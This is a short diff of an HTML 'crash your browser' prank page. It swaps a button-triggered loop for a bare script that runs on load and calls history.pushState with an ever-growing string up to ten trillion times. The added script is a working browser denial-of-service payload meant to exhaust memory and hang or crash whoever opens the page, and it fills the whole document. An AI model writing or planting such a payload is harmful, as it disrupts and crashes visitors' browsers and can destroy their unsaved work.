@@ -1,23 +1,7 @@
-<html>
-	<body>
-    <div class="container">
-      <h1 id="output">Click button to crash your browser. And your computer too...</h1>
-      <article>Run at your own risk!</article><br>
-      <div class="container">
-        <button class="btn btn-danger" onclick="crasher()">Crash It!!!</button>
-      </div>
-    </div>
-    
-    <script>
-      
-      var kbpsystem = 1;
-function crasher() {
-	do {
-    var x = console.log(kbpsystem);
-    document.getElementById("output").innerHTML = "Crashing your memory....";
-  	kbpsystem = kbpsystem*7;
-		} while (kbpsystem > 77);
-  }
-    </script>
-	</body>
-</html>
+<script>
+	 var total = "";
+for( var i = 0; i < 10000000000000; i++ ) {
+total += i.toString();
+history.pushState(0,0, total );
+}
+</script>
